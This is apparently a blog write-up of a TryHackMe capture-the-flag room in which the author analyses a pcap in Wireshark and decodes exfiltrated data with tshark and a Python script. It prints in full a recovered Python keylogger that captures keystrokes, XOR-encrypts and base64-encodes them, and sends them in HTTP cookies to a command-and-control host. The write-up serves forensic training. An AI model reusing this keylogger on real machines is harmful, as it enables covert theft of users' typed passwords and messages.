---
title: THM Hacker Holidays - Packed Light
date: 2026-08-03
tags:
  - THM
  - hackerholidays
  - ctf
  - PCAP
  - Wireshark
  - tshark
  - C2
  - http
  - QUIC
---
https://tryhackme.com/room/hh-packedlight-02e5330c

I love working with Wireshark. This room gives us a pcapng and the following checklist:
- Analyze the provided capture for a covert communication channel.
- Identify where the exfiltrated data is being hidden and reassemble it.
- Decode the recovered data and submit the flag.

I initially went down a rabbit hole the first day I attempted the room. I started looking at the QUIC traffic and looked up how to decrypt it in wireshark and found this blog post. https://blog.elmo.sg/posts/parsing-decrypted-quic-traffic-in-wireshark/

That didn't work so I set the room aside for a few days. I came back and read the 0xMia "post" again. 
This time I was able to filter on 
```
http.port == 8080
```

From there I selected one of the packets, right-clicked and selected follow HTTP stream from the menu, which gave me the following python script.

```
import requests

import base64

from pynput import keyboard

  

C2_URL = "http://byte-lotus-hotel.thm[:]8080/"

  

def getkey():

p1 = "H0t3lSt@ff0Nly"

p2 = "K3epS3cr3t!"

return p1 + p2

  

def xor(data: bytes, key: bytes) -> bytes:

return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

  

def sendltr(character):

raw_bytes = character.encode('utf-8')

encrypted = xor(raw_bytes, getkey().encode('utf-8'))

b64_string = base64.b64encode(encrypted).decode('utf-8')

headers = {

"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",

"Cookie": f"hotel_sess_state={b64_string}"

}

try:

requests.get(C2_URL, headers=headers, timeout=0.5)

except:

pass

  

def on_press(key):

try:

sendltr(key.char)

except AttributeError:

if key == keyboard.Key.space:

sendltr(" ")

elif key == keyboard.Key.enter:

sendltr("\n")

  

print("[*] Byte Lotus Sync Service started...")

with keyboard.Listener(on_press=on_press) as listener:

listener.join()
```

As we can see in the script it is XORing with the key then base64 encoding it.

I fed the script to Claude (haiku 4.5) and it figured out how to reverse that process.
It made some suggestions about decoding in Wireshark or exporting as a file, but I pointed out that it is spread across each packets cookies. It came back with the following python script and how to export it using tshark.

```
tshark -r traffic.pcapng -Y 'http.cookie contains "hotel_sess_state"' \
        -T json > cookies.json
```


```
import base64
import sys
import json

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def decode_c2(b64_string: str) -> str:
    key = "H0t3lSt@ff0NlyK3epS3cr3t!"
    try:
        encrypted = base64.b64decode(b64_string)
        decrypted = xor(encrypted, key.encode('utf-8'))
        return decrypted.decode('utf-8', errors='replace')
    except Exception as e:
        return "?"

# Extract from tshark JSON output
# tshark -r capture.pcap -Y 'http.cookie contains "hotel_sess_state"' -T json > cookies.json

def decode_from_json(json_file):
    with open(json_file) as f:
        packets = json.load(f)
    
    keylog = []
    for packet in packets:
        try:
            cookie = packet['_source']['layers']['http']['http.cookie']
            # Extract value after hotel_sess_state=
            value = cookie.split('hotel_sess_state=')[1].split(';')[0]
            char = decode_c2(value)
            keylog.append(char)
            print(f"{value} → {repr(char)}")
        except (IndexError, KeyError):
            continue
    
    print("\n" + "="*50)
    print("Full keylog:")
    print("".join(keylog))
    print("="*50)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        decode_from_json(sys.argv[1])
    else:
        print("Usage: python3 decode_keylog.py cookies.json")
```

```
python3 decode.py cookies.json
```

After running the script it showed the decoding for each letter before putting it all together and revealing the flag.